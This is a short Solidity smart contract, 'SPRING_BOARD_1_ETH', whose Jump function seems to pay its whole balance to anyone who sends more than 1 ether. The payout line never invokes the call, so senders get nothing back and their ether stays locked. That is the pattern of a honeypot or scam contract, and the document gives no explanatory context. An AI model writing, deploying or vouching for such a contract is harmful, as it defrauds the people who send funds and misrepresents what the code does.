
contract SPRING_BOARD_1_ETH {

    function Jump() public payable {
        if(msg.value > 1 ether) {
            msg.sender.call.value(this.balance);
        }
    }
}